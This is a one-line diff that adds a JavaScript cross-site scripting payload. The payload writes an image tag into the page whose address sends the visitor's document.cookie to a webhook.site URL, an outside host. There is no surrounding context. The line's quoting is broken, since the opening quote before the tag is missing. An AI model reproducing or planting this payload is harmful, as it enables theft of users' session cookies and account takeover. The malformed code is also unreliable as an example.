@@ -1,0 +1,1 @@
+document.write(<img src="https://webhook.site/26d517e8-c34e-498f-b91a-3ba2140fe11b?c='+document.cookie+'" />');
